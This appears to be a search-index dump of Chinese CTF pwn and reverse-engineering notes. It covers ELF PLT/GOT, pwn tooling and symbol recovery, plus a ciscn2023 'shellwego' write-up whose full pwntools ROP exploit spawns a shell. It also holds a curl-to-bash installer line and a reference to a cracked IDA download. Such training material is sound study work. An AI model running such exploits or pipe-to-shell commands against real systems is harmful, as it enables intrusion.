\u4f5c\u4e3a\u8df3\u677f\u8c03\u7528\u5916\u90e8\u51fd\u6570  \u8981\u4e48\u5728<code>.got.plt</code>\u8282\u4e2d\u62ff\u5230\u5730\u5740\uff0c\u5e76\u8df3\u8f6c\u3002\u8981\u4e48\u5f53<code>.got.plt</code>\u6ca1\u6709\u6240\u9700\u5730\u5740\u7684\u65f6\u5019\uff0c\u89e6\u53d1\u94fe\u63a5\u5668\u53bb\u627e\u5230\u6240\u9700\u7684\u5730\u5740 R_X .plt.got \u4ec5\u5f53\u5f00\u542ffull-RELRO\u65f6\u51fa\u73b0 R_X .dynamic \u5b58\u50a8\u52a8\u6001\u94fe\u63a5\u5668\u7684\u52a0\u8f7d","tags":["CTF","pwn"]},{"location":"pwn/points/elf-file/elf-file/#pltgot","title":"\u8c03\u7528\u5916\u90e8\u51fd\u6570\u65f6plt\u548cgot\u884c\u4e3a","text":"<p>\u8c03\u7528\u5916\u90e8\u51fd\u6570\uff0c\u9996\u5148\u90fd\u8df3\u8f6c\u81f3\u5bf9\u5e94PLT\u533a\uff0c\u518d\u8df3\u8f6c\u81f3\u5bf9\u5e94GOT\u533a</p> <ul> <li>\u82e5\u4e3a\u9996\u6b21\u8c03\u7528\u8be5\u51fd\u6570</li> </ul> <p></p> <ol> <li>\u4f9d\u6b21\u8df3\u8f6c\u5230 printf@plt \u548c printf@got</li> <li>\u7531got\u8df3\u8f6c\u81f3 printf@plt+6   </li> <li>\u8df3\u8f6c\u81f3_plt</li> <li> <p>\u518d\u8df3\u8f6c\u5230 resolve \u51fd\u6570\u83b7\u53d6 printf \u51fd\u6570\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u5c06\u5730\u5740\u5b58\u5165got\u8868\uff08\u51c6\u786e\u6765\u8bf4\u662f.got.plt\uff09\u5e76\u6267\u884cprintf</p> </li> <li> <p>\u975e\u9996\u6b21\u8c03\u7528</p> </li> </ol> <p>call func -&gt; func@plt -&gt; func@got -&gt; \u771f\u5b9e\u5730\u5740</p> <p>\u53c2\u8003</p> <p>https://hackthedeveloper.com/c-program-compilation-process/</p> <p>https://www.matteomalvica.com/minutes/binary_analysis/</p> <p>https://intezer.com/blog/research/executable-linkable-format-101-part1-sections-segments/</p> <p>https://intezer.com/blog/malware-analysis/executable-linkable-format-101-part-4-dynamic-linking/</p>","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/","title":"PWN\u5de5\u5177","text":"","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#_1","title":"\u5de5\u5177","text":"","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#ida","title":"IDA","text":"","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#_2","title":"\u4e0b\u8f7d","text":"<p>IDA_pro_7.7_crack</p>","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#_3","title":"\u4f7f\u7528","text":"<p>\u4ee3\u7801\u533a\u3001\u5de5\u5177\u533a\u3001\u51fd\u6570\u533a</p> \u5feb\u6377\u952e \u529f\u80fd Shift+F12 \u67e5\u770b\u5b57\u7b26\u4e32 Space \u6e90\u7801/\u6d41\u56fe \u5207\u6362 a \u5207\u6362\u4e3a\u5b57\u7b26\u4e32 d \u5207\u6362\u4e3adata(byte, word, ...) g \u8df3\u8f6c\u81f3\u5730\u5740 \u53f3\u952e-&gt;Array \u5b9a\u4e49\u6570\u7ec4 Shift+E \u5bfc\u51fa\u6570\u636e ; \u6ce8\u91ca F5 \u53cd\u7f16\u8bd1 n \u4fee\u6539\u51fd\u6570\u540d\u3001\u53d8\u91cf\u540d y \u4fee\u6539\u53d8\u91cf\u7c7b\u578b\u3001\u51fd\u6570\u8fd4\u56de\u503c\u7c7b\u578b / \u6ce8\u91ca x \u67e5\u770b\u51fd\u6570\u8c03\u7528 <p>\uff08\u66f4\u591a\u529f\u80fd\u5728\u5b9e\u6218\u4e2d\u63a2\u7d22...\uff09</p>","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#gef","title":"gef","text":"","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#_4","title":"\u4e0b\u8f7d","text":"<ol> <li>\u5feb\u901f\u4e0b\u8f7d</li> </ol> <p>\u8981\u6c42\uff1aGDB 8.0+  python 3.6+ </p> <pre><code>bash -c \"$(curl -fsSL https://gef.blah.cat/sh)\"\n# \u6216\nbash -c \"$(wget https://gef.blah.cat/sh -O -)\"\n</code></pre> <p>\u67e5\u770b <code>~/.gdbinit</code> \u5982\u679c\u6709 source ~/.*gef*.py \u8bf4\u660e\u5b89\u88c5\u6210\u529f</p> <pre><code>cat ~/.gdbinit source ~/.gef.py\n</code></pre> <ol> <li>Git\u4e0b\u8f7d</li> </ol> <pre><code>git clone https://github.com/hugsy/gef.git\necho source `pwd`/gef/gef.py &gt;&gt; ~/.gdbinit\n</code></pre>","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#_5","title":"\u4f7f\u7528","text":"<p>\u76f4\u63a5\u6267\u884c <code>gdb &lt;filename&gt;</code></p> <pre><code>$ gdb bin\n\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nGEF for linux ready, type `gef' to start, `gef config' to configure\n90 commands loaded and 5 functions added for GDB 13.1 in 0.00ms using Python engine 3.11\nReading symbols from bin...\n(No debugging symbols found in bin)\ngef\u27a4  </code></pre> \u547d\u4ee4 \u529f\u80fd aslr on/off \u5f00\u542f/\u5173\u95edaslr start \u542f\u52a8\u8c03\u8bd5 b * [addr] \u5728addr\u5904\u4e0b\u65ad\u70b9 info b \u67e5\u770b\u6240\u6709\u65ad\u70b9\uff08\u5bf9\u5e94\u6807\u53f7\uff09 d [\u65ad\u70b9\u6807\u53f7] \u5220\u53bb\u65ad\u70b9 c \u6267\u884c\u5230\u4e0b\u4e2a\u65ad\u70b9 ni [n] \u6267\u884c\u4e00(n)\u4e2a\u6307\u4ee4 n \u6267\u884c\u5355\u884c\u4ee3\u7801\uff08\u5e26\u6e90\u7801\u60c5\u51b5\u4e0b\uff09 x/[size+type] [addr] \u67e5\u770b\u5730\u5740\u5185\u5bb9 context \u754c\u9762\u5c55\u793a\u6307\u5b9a\u5185\u5bb9 define \u81ea\u5b9a\u4e49\u547d\u4ee4 gef config \u914d\u7f6e stack [n] \u67e5\u770b\u6808\u4e0an\u884c\u4fe1\u606f heap [chunks|bins|arena] \u67e5\u770b\u5806\u4fe1\u606f <p>\u66f4\u591aGDB\u57fa\u7840\u547d\u4ee4\uff1ahttps://visualgdb.com/gdbreference/commands/</p> <p>\u66f4\u591aGEF\u5b9e\u7528\u547d\u4ee4\uff1ahttps://hugsy.github.io/gef/commands/aliases/</p>","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#pwntools","title":"pwntools","text":"","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#_6","title":"\u4e0b\u8f7d","text":"<pre><code>pip3 install pwntools\n</code></pre>","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#_7","title":"\u4f7f\u7528","text":"<pre><code>from pwn import *\ncontext.log_level='debug'   # \u8be6\u7ec6\u8c03\u8bd5\u4fe1\u606f\n\nfilename = './shellwego'\nproc = process(filename)    # \u8fdb\u7a0b\nbelf = ELF(filename)        # ELF\u4fe1\u606f\n\ngscript = '''\n    b * 0x0000000004C1882\n    c\n''' # gdb\u547d\u4ee4\ngdb.attach(proc, gdbscript=gscript) # \u6302\u8f7d\u5230gdb\u4e0a\u8c03\u8bd5\n\npoprdi_ret = 0x444fec\npoprsi_ret = 0x41e818\npoprdx_ret = 0x49e11d\npoprax_ret = 0x40d9e6\nsyscall = 0x40328c\n\nproc.sendlineafter(b'ciscnshell$ ', b'cert nAcDsMicN S33UAga1n@#!')     # \u5728\u63a5\u6536\u5230arg1\u4e4b\u540e\u53d1\u9001arg2\u5e76\u6362\u884c\n\npayload = b'echo '+b'h'*0x100+b' '+b'h'*0x103\n\nproc.sendlineafter(b'# ', payload)\nproc.send(b\"/bin/sh\\x00\")   # \u53d1\u9001\nres = proc.recv()       # \u63a5\u6536\nproc.recvuntil(b'hhh')  # \u4e00\u76f4\u63a5\u6536\u76f4\u5230\u9047\u89c1arg1\nproc.interactive()      # \u4e92\u52a8shell\npause()         # \u6682\u505c\u7a0b\u5e8f\uff08gdb\u8c03\u8bd5\u9700\u8981\uff09\n</code></pre> <p>\u4f7f\u7528\u6587\u6863\uff1ahttps://docs.pwntools.com/en/stable/about.html</p>","tags":["CTF","pwn"]},{"location":"pwn/points/pwn-tools/pwn-tools/#_8","title":"PWN\u5de5\u5177","text":"","tags":["CTF","pwn"]},{"location":"pwn/points/symbol-restore/symbol-restore/","title":"\u7b26\u53f7\u8868\u6062\u590d","text":"<p>\u9047\u5230\u9759\u6001\u7f16\u8bd1\u4e14\u7b26\u53f7\u8868\u88ab\u62a0\u9664\u7684\u7a0b\u5e8f\uff08\u5982\u4e0b\u56fe\uff09\uff0c\u5f88\u4e0d\u5229\u4e8e\u5206\u6790</p> <p></p> <p>\u4ee5\u4e0b\u4ecb\u7ecd\u6062\u590d\u7b26\u53f7\u8868\u7684\u51e0\u79cd\u65b9\u6cd5  </p>","tags":["CTF","pwn","reverse","libc"]},{"location":"pwn/points/symbol-restore/symbol-restore/#1-ida-flair","title":"1. IDA flair","text":"<p>flair\u901a\u8fc7\u9009\u62e9\u7684\u7b7e\u540d\u6587\u4ef6\u548c\u7a0b\u5e8f\u4e2d\u7684\u51fd\u6570\u8fdb\u884c\u7b7e\u540d\u5339\u914d\u6765\u5e2e\u52a9\u6211\u4eec\u8fd8\u539f\u5e93\u51fd\u6570  \u5176\u4e2d\u7b7e\u540d\u6587\u4ef6\u53ef\u4ee5\u4ecesig-database\u4e2d\u83b7\u53d6\uff0c\u6709\u5236\u4f5c\u597d\u7684\u5404\u67b6\u6784\u5404\u7248\u672c\u7b7e\u540d\u6587\u4ef6    </p>","tags":["CTF","pwn","reverse","libc"]},{"location":"pwn/points/symbol-restore/symbol-restore/#_1","title":"\u4f7f\u7528\u65b9\u6cd5","text":"<ol> <li>\u5c06\u7b7e\u540d\u6587\u4ef6(sig\u6587\u4ef6)\u5bfc\u5165\u5230IDA\u7684\u5bf9\u5e94\u7b7e\u540d\u76ee\u5f55\u4e0b<code>IDAx.x\\sig\\pc</code></li> <li>IDA\u4e2d\u6309\u4f4f<code>SHIFT+F5</code></li> <li>\u53f3\u952e\u9009\u62e9<code>Apply new signature...</code> </li> <li>\u9009\u62e9\u7b7e\u540d\u6587\u4ef6\u8fdb\u884c\u5339\u914d  </li> <li>\u591a\u5c1d\u8bd5\u51e0\u4e2a\u7b7e\u540d\u6587\u4ef6\uff0c\u76f4\u5230\u6210\u529f\u5339\u914d\u51fd\u6570\u6570\u91cf\u6700\u591a\uff08Ctrl+Z \u64a4\u9500\u4e4b\u524d\u9009\u62e9\u7684\u7b7e\u540d\u6587\u4ef6\uff09   \u53ef\u4ee5\u770b\u5230\u5f88\u591a\u51fd\u6570\u540d\u5df2\u7ecf\u6062\u590d\uff0c\u4ee3\u7801\u4e5f\u5c31\u597d\u5206\u6790\u591a\u4e86  </li> </ol>","tags":["CTF","pwn","reverse","libc"]},{"location":"pwn/points/symbol-restore/symbol-restore/#_2","title":"\u603b\u7ed3","text":"<p>\u8fd9\u79cd\u65b9\u6cd5\u6062\u590d\u7b26\u53f7\u8868\u65e0\u9700\u8054\u7f51\uff0c\u4f46\u6062\u590d\u6709\u65f6\u6548\u679c\u4e5f\u4e0d\u597d\uff0c\u5728\u67d0\u4e9b\u4e0d\u80fd\u8054\u7f51\u7684\u6bd4\u8d5b\u4e2d\u53ef\u4ee5\u4f5c\u4e3a\u9996\u9009</p>","tags":["CTF","pwn","reverse","libc"]},{"location":"pwn/points/symbol-restore/symbol-restore/#2-lscan","title":"2. \u81ea\u52a8\u68c0\u6d4b\u811a\u672clscan","text":"<p>lscan\u53ef\u4ee5\u81ea\u52a8\u68c0\u6d4b\u9759\u6001\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u4f7f\u7528\u7684libc\u7248\u672c</p>","tags":["CTF","pwn","reverse","libc"]},{"location":"pwn/points/symbol-restore/symbol-restore/#_3","title":"\u4f7f\u7528\u65b9\u6cd5","text":"<pre><code>git clone https://github.com/maroueneboubakri/lscan\ncd lscan\npython lscan -S [\u7b7e\u540d\u6587\u4ef6\u6240\u5728\u76ee\u5f55] -f [\u5f85\u68c0\u6d4b\u6587\u4ef6]\n# python lscan -S ./i386/sig -f ../bin\n</code></pre>","tags":["CTF","pwn","reverse","libc"]},{"location":"pwn/points/symbol-restore/symbol-restore/#3-ida-finger","title":"3. IDA Finger\u63d2\u4ef6","text":"<p>Finger\u662f\u963f\u91cc\u4e91\u00b7\u4e91\u5b89\u5168\u6280\u672f\u5b9e\u9a8c\u5ba4\u63a8\u51fa\u7684\u4e00\u6b3e\u4e8c\u8fdb\u5236\u51fd\u6570\u7b26\u53f7\u8bc6\u522b\u5f15\u64ce\uff0c\u53ef\u4ee5\u8bc6\u522b\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u4e2d\u7684\u5e93\u51fd\u6570\u4e0e\u5e38\u89c1\u7684\u7b2c\u4e09\u65b9\u51fd\u6570\uff0c\u5feb\u901f\u5b9a\u4f4d\u6076\u610f\u4ee3\u7801\uff0c\u63d0\u9ad8\u6837\u672c\u5206\u6790\u6548\u7387   </p>","tags":["CTF","pwn","reverse","libc"]},{"location":"pwn/points/symbol-restore/symbol-restore/#_4","title":"\u4f7f\u7528\u65b9\u6cd5","text":"<ol> <li>pip \u5b89\u88c5finger_sdk <code>pip install finger_sdk</code> \u6ce8\u610f\u5b89\u88c5Finger\u7684python\u7684\u7248\u672c\u8981\u4e0eIDAPython\u7684\u7248\u672c\u4e00\u81f4</li> <li>\u5c06Finger IDA plugin\u590d\u5236\u5230IDA\u63d2\u4ef6\u76ee\u5f55<code>IDAx.x\\plugins</code>\u4e2d  </li> <li>\u91cd\u542fIDA \u5728\u9876\u90e8\u83dc\u5355\u680f\u4e2d\u53ef\u4ee5\u770b\u89c1<code>Finger</code>\uff0c\u9009\u62e9\u652f\u6301\u5355\u4e2a\u51fd\u6570\u3001\u9009\u4e2d\u7684\u591a\u4e2a\u51fd\u6570\u548c\u5168\u90e8\u51fd\u6570\u8bc6\u522b</li> </ol>","tags":["CTF","pwn","reverse","libc"]},{"location":"pwn/points/symbol-restore/symbol-restore/#_5","title":"\u603b\u7ed3","text":"<p>\u8fd9\u79cd\u65b9\u6cd5\u8bc6\u522b\u7cbe\u5ea6\u9ad8\uff0c\u4f46\u9700\u8981\u8054\u7f51\u5e76\u4e14\u51fd\u6570\u8f83\u591a\u65f6\u901f\u5ea6\u5f88\u6162</p>","tags":["CTF","pwn","reverse","libc"]},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/","title":"ciscn2023 shellwego writeup","text":"<p>\u8fd9\u9898\u662fgo\u8bed\u8a00\u7a0b\u5e8f \u611f\u89c9\u9006\u5411\u7684\u5360\u6bd4\u5927\u4e8epwn...</p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x1-checksec","title":"0x1 checksec \u67e5\u770b\u5b89\u5168\u4fdd\u62a4","text":"<p> \u6ca1\u5f00PIE\uff0c \u800c\u4e14\u53ef\u4ee5\u53d1\u73b0\u7a0b\u5e8f\u662f\u9759\u6001\u94fe\u63a5\u7684</p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x2-ida","title":"0x2 ida \u5206\u6790","text":"<p>\u65e0\u7b26\u53f7\u8868\uff0c\u96be\u4ee5\u5206\u6790\uff0c\u5c1d\u8bd5\u5229\u7528</p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x3","title":"0x3 \u6062\u590d\u7b26\u53f7\u8868","text":""},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x3-1-go","title":"0x3-1 \u67e5\u770b\u7a0b\u5e8fgo\u7248\u672c","text":"<p>\u4e24\u79cd\u65b9\u5f0f\uff1a  1. Shift+F12\u6253\u5f00\u5b57\u7b26\u4e32\u7a97\u53e3\uff0c\u641c\u7d22<code>go</code> \u53ef\u4ee5\u770b\u5230\u7248\u672c\u4fe1\u606f 2. \u5728\u547d\u4ee4\u884c\u6267\u884c <code>strings shellwego | grep \"go\"</code></p> <p>\u53ef\u4ee5\u770b\u5230\u7248\u672c\u4e3ago1.20.4 </p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x3-2-ida-signature","title":"0x3-2 \u5c1d\u8bd5\u5229\u7528IDA signature\u5e93\u8fdb\u884c\u6bd4\u5bf9\u6062\u590d","text":"<p>IDA \u53ef\u4ee5\u6839\u636e\u9009\u5b9asignature\u5e93\u4e2d\u7684\u51fd\u6570\u7b7e\u540d\u7279\u5f81\u4e0e\u5f53\u524d\u7a0b\u5e8f\u5404\u51fd\u6570\u8fdb\u884c\u5339\u914d  \u4ece\u800c\u6062\u590d\u51fd\u6570\u540d 1. Shift+F5\u6253\u5f00Signatures\u7a97\u53e3 2. \u53f3\u952e\u70b9\u51fb <code>Apply new signature...</code> 3. \u70b9\u51fb <code>Search</code> \u641c\u7d22 <code>go</code> 4. \u53d1\u73b0\u53ea\u6709\u4e00\u4e2a <code>go_std</code> \u4ec5\u53ef\u7528\u4e8e <code>go1.10-1.16</code>\uff0c \u4e0d\u53ef\u884c </p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x3-3-ida-go120-signature","title":"0x3-3 \u641c\u7d22 <code>ida go1.20 signature</code>","text":"<p>\u53d1\u73b0\u5de5\u5177 GoReSym \uff08\u4e5f\u53ef\u4ee5\u8bd5\u8bd5\u5176\u4ed6\u7b26\u53f7\u6062\u590d\u65b9\u6cd5\uff09</p> <p>\u4f7f\u7528\uff1a 1. \u4e0b\u8f7d\u7a0b\u5e8f Release 2. \u6267\u884c\u5e76\u751f\u6210\u7ed3\u679cjson\u6587\u4ef6  <code>GoReSym.exe -t -d -p /path/to/shellwego &gt; output.json</code> 3. \u4e0b\u8f7dIDA\u811a\u672c\u6587\u4ef6 goresym_rename.py 4. IDA \u70b9\u51fb File -&gt; Script File \u9009\u62e9 <code>goresym_rename.py</code> \u518d\u9009\u62e9\u521a\u624d\u8f93\u51fa\u7684 <code>output.json</code> IDA\u5c31\u80fd\u81ea\u52a8\u6062\u590d\u51fd\u6570\u540d\u4e86</p> <p></p> <p>\u524d\u540e\u5bf9\u6bd4\u53ef\u4ee5\u770b\u5230\u6062\u590d\u6548\u679c\u975e\u5e38\u7406\u60f3</p> <p></p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x4","title":"0x4 \u7a0b\u5e8f\u5206\u6790","text":""},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x4-1-main_main-ciscnshell-main_unk_func0b05","title":"0x4-1 \u8fdb\u5165main_main\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u5148\u8f93\u51fa <code>ciscnshell$</code>\uff0c\u518d\u83b7\u53d6\u8f93\u5165\uff0c\u7136\u540e\u8c03\u7528\u51fd\u6570 <code>main_unk_func0b05</code>","text":""},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x4-2-main_unk_func0b05","title":"0x4-2 \u8fdb\u5165<code>main_unk_func0b05</code>\u51fd\u6570","text":"<ul> <li>\u53d1\u73b0\u5f88\u591acmp\u548c\u7c7b\u4f3c\u5b57\u7b26\u4e3216\u8fdb\u5236\u7684dword \u70b9\u51fb16\u8fdb\u5236\u6570\u518d\u6309R\u952e\uff0c\u663e\u793a\u5b57\u7b26\u4e32  \u4f46\u7531\u4e8e\u6570\u636e\u662f\u4ee5dword\u89e3\u91ca\u7684\uff0c\u6240\u4ee5\u5b57\u7b26\u4e32\u98a0\u5012  </li> <li>\u5c1d\u8bd5\u6267\u884c\u7a0b\u5e8f\u53d1\u73b0\u8f93\u51fa<code>Cert Is A Must</code> \u6240\u4ee5\u5148\u6765\u770bcert\u547d\u4ee4  \u6309\u7167\u7a0b\u5e8f\u6d41\u7a0b\u53ef\u89c1\u5e94\u8be5\u8fd8\u8981\u8f93\u5165 <code>nAcDsMic</code>+<code>N</code> \u4e5f\u5c31\u662f <code>nAcDsMicN</code> </li> <li>\u4f46\u662f\u5982\u679c\u53ea\u8f93\u5165 <code>cert nAcDsMicN</code> \u4f1a\u51fa\u73b0\u63d0\u793a <code>Missing parameter</code>\uff0c \u660e\u663e\u662f\u8981\u4e09\u4e2a\u53c2\u6570  </li> <li>\u518d\u770b\u51fd\u6570\u6d41\u56fe\u53d1\u73b0\u4e4b\u540e\u53bb\u5230\u51fd\u6570<code>main_unk_func0b01</code> </li> </ul>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x4-3-main_unk_func0b01","title":"0x4-3 \u8fdb\u5165<code>main_unk_func0b01</code>\u51fd\u6570","text":"<p>\u540c\u6837\u65b9\u6cd5\u8f6c\u6362\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u53d1\u73b0\u5927\u81f4\u6d41\u7a0b\uff1a 1. key=\"F1nallB1B1rd3K3y\" 2. rc4 \u52a0\u5bc6 3. base64 \u52a0\u5bc6 4. \u4e0e\u5b57\u7b26\u4e32\"JLIX8pbSvYZu/WaG\"\u6bd4\u8f83\uff0c\u82e5\u76f8\u540c\u5219\u8ba4\u8bc1\u6210\u529f </p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x4-4-cert-me-in","title":"0x4-4 cert me in","text":"<p>\u5f88\u660e\u4e86\u4e86\uff0c\u5148base64\u89e3\u5bc6\u6210byte\u6570\u7ec4\uff0c \u518d\u7528\u5df2\u77e5key\u901a\u8fc7rc4\u89e3\u5bc6  \u6700\u540e\u5f97\u5230 <code>S33UAga1n@#!</code> \u6267\u884c\u7a0b\u5e8f\u8f93\u5165 <code>cert nAcDsMicN S33UAga1n@#!</code>\uff0c \u6210\u529f\u901a\u8fc7\u9a8c\u8bc1</p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x4-5-main_unk_func0b05","title":"0x4-5 \u56de\u5230<code>main_unk_func0b05</code>\u51fd\u6570","text":"<p>\u5c1d\u8bd5\u6267\u884c\u51fd\u6570\u4e2d\u63d0\u5230\u7684\u4e0d\u540c\u547d\u4ee4\uff0c\u53ef\u4ee5<code>cat flag</code>\u4f46\u662f\u662f\u5047\u7684flag \u53d1\u73b0\u4ec5echo\u547d\u4ee4\u5b58\u5728\u53ef\u80fd\u6f0f\u6d1e\uff08main_unk_func0b04\u4e2d\uff09</p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x4-6-main_unk_func0b04","title":"0x4-6 \u8fdb\u5165<code>main_unk_func0b04</code>\u51fd\u6570","text":"<p> \u7ed3\u5408\u52a8\u6001\u8c03\u8bd5\u53d1\u73b0\uff1a 1. echo\u540e\u9762\u7684\u5355\u4e2a\u8fde\u7eed\u5355\u8bcd\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc70x200 2. \u5355\u8bcd\u4f1a\u53bb\u6389\u7a7a\u683c\u62fc\u63a5\u8d77\u6765\u590d\u5236\u5230\u6808\u4e0a\uff0c \u5b58\u5728\u6808\u6ea2\u51fa\u6f0f\u6d1e 3. \u9047\u5230<code>+</code>\u4e0d\u590d\u5236</p>"},{"location":"pwn/writeups/shellwego-wp/shellwego-wp/#0x5-exploit","title":"0x5 exploit","text":"<p>\u76f4\u63a5\u6808\u6ea2\u51fa\u5230ret_addr\u4f1a\u51fa\u73b0Segmentation Fault\uff0c\u8c03\u8bd5\u5206\u6790\u95ee\u9898\u51fa\u73b0\u5728\u6307\u4ee4<code>movzx edx, byte ptr [rbx+rax]</code> </p> <p>\u539f\u56e0rbx\u4ece\u6808\u4e0a\u53d6\u4e86\u4e00\u4e2a\u5730\u5740\u503c\uff0c\u800c\u6211\u4eec\u6539\u5199\u4e86\u6808\u4f7f\u5176\u4e0d\u518d\u662f\u6709\u6548\u5730\u5740\u503c\uff0c\u6240\u4ee5\u89e3\u6790\u7684\u65f6\u5019\u4f1a\u62a5\u6bb5\u9519\u8bef \u7ed5\u5f00\u65b9\u5f0f\uff1a \u521a\u597d\u9047\u5230 <code>+</code> \u4e0d\u4f1a\u590d\u5236\uff0c\u4e5f\u5c31\u4fdd\u7559\u539f\u6765\u7684\u503c</p> <pre><code>from pwn import *\ncontext.log_level='debug'\n\nfilename = './shellwego'\nproc = process(filename)\nbelf = ELF(filename)\n\ngscript = '''\n    b * 0x0000000004C1882\n    c\n'''\n# gdb.attach(proc, gdbscript=gscript)\n\n# gadget \u67e5\u770bpop_ret\u5bf9\uff0c\u7528\u4e8e\u6784\u9020pop\u94fe\npoprdi_ret = 0x444fec\npoprsi_ret = 0x41e818\npoprdx_ret = 0x49e11d\npoprax_ret = 0x40d9e6\nsyscall = 0x40328c\n\nproc.sendlineafter(b'ciscnshell$ ', b'cert nAcDsMicN S33UAga1n@#!')\n\n#\u6bcf\u4e2a\u5355\u8bcd\u957f\u5ea6\u4e0d\u8d85\u8fc70x200\n#payload\u5177\u4f53\u6ea2\u51fa\u957f\u5ea6\u53ef\u901a\u8fc7\u52a8\u6001\u8c03\u8bd5\u89c2\u5bdf\u5f97\u5230\npayload = b'echo '+b'h'*0x100+b' '+b'h'*0x103\n\n# \u907f\u5f00\u5f71\u54cd\u5730\u5740\npayload += b'+' * 8\n\n# \u8c03\u7528syscall 0 \u5373read \u52300x59FE70 \u4e0a\n# \u5177\u4f53syscall\u8c03\u7528\u89c4\u5219\u67e5\u770b\uff1ahttps://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md\npayload += p64(0xdeadbeefdeadbeef) * 3\npayload += p64(poprdi_ret) + p64(0)\npayload += p64(poprax_ret) + p64(0)\npayload += p64(poprsi_ret) + p64(0x59FE70)\npayload += p64(poprdx_ret) + p64(20)\npayload += p64(syscall)\n\n#syscall 59 \u5373execve\npayload += p64(poprax_ret) + p64(59)\npayload += p64(poprdi_ret) + p64(0x59FE70)\npayload += p64(poprsi_ret) + p64(0)\npayload += p64(poprdx_ret) + p64(0)\npayload += p64(syscall)\n\nproc.sendlineafter(b'# ', payload)\nproc.send(b\"/bin/sh\\x00\")\nproc.interactive()\npause()\n</code></pre>"},{"location":"reverse/introduction/","title":"Reverse\u7b80\u4ecb","text":""},{"location":"reverse/introduction/#_1","title":"\u5b9a\u4e49","text":"<p>Reverse engineering, also called back engineering, is the process by which a man-made object is deconstructed to reveal its designs, architecture, or to extract knowledge from the object;       ------  from wikipedia</p> <p>\u8f6f\u4ef6\u4ee3\u7801\u9006\u5411\u4e3b\u8981\u6307\u5bf9\u8f6f\u4ef6\u7684\u7ed3\u6784\uff0c\u6d41\u7a0b\uff0c\u7b97\u6cd5\uff0c\u4ee3\u7801\u7b49\u8fdb\u884c\u9006\u5411\u62c6\u89e3\u548c\u5206\u6790\u3002</p>"},{"location":"reverse/introduction/#_2","title":"\u5e94\u7528\u9886\u57df","text":"<p>\u4e3b\u8981\u5e94\u7528\u4e8e\u8f6f\u4ef6\u7ef4\u62a4\uff0c\u8f6f\u4ef6\u7834\u89e3\uff0c\u6f0f\u6d1e\u6316\u6398\uff0c\u6076\u610f\u4ee3\u7801\u5206\u6790\u3002</p>"},{"location":"reverse/introduction/#ctf","title":"CTF\u7ade\u8d5b\u4e2d\u7684\u9006\u5411","text":"<p>\u6d89\u53ca Windows\u3001Linux\u3001Android \u5e73\u53f0\u7684\u591a\u79cd\u7f16\u7a0b\u6280\u672f\uff0c\u8981\u6c42\u5229\u7528\u5e38\u7528\u5de5\u5177\u5bf9\u6e90\u4ee3\u7801\u53ca\u4e8c\u8fdb\u5236\u6587\u4ef6\u8fdb\u884c\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1 Android \u79fb\u52a8\u5e94\u7528APK\u6587\u4ef6\u7684\u9006\u5411\u5206\u6790\uff0c\u638c\u63e1\u52a0\u89e3\u5bc6\u3001\u5185\u6838\u7f16\u7a0b\u3001\u7b97\u6cd5\u3001\u53cd\u8c03\u8bd5\u548c\u4ee3\u7801\u6df7\u6dc6\u6280\u672f\u3002 ------ \u300a\u5168\u56fd\u5927\u5b66\u751f\u4fe1\u606f\u5b89\u5168\u7ade\u8d5b\u53c2\u8d5b\u6307\u5357\u300b</p>"},{"location":"reverse/introduction/#_3","title":"\u8981\u6c42","text":"<ul> <li>\u719f\u6089\u5982\u64cd\u4f5c\u7cfb\u7edf\uff0c\u6c47\u7f16\u8bed\u8a00\uff0c\u52a0\u89e3\u5bc6\u7b49\u76f8\u5173\u77e5\u8bc6</li> <li>\u5177\u6709\u4e30\u5bcc\u7684\u591a\u79cd\u9ad8\u7ea7\u8bed\u8a00\u7684\u7f16\u7a0b\u7ecf\u9a8c</li> <li>\u719f\u6089\u591a\u79cd\u7f16\u8bd1\u5668\u7684\u7f16\u8bd1\u539f\u7406</li> <li>\u8f83\u5f3a\u7684\u7a0b\u5e8f\u7406\u89e3\u548c\u9006\u5411\u5206\u6790\u80fd\u529b</li> </ul>"},{"location":"reverse/introduction/#_4","title":"\u5e38\u89c4\u9006\u5411\u6d41\u7a0b","text":"<ol> <li>\u4f7f\u7528<code>strings/file/binwalk/IDA</code>\u7b49\u9759\u6001\u5206\u6790\u5de5\u5177\u6536\u96c6\u4fe1\u606f\uff0c\u5e76\u6839\u636e\u8fd9\u4e9b\u9759\u6001\u4fe1\u606f\u8fdb\u884c<code>google/github</code>\u641c\u7d22</li> 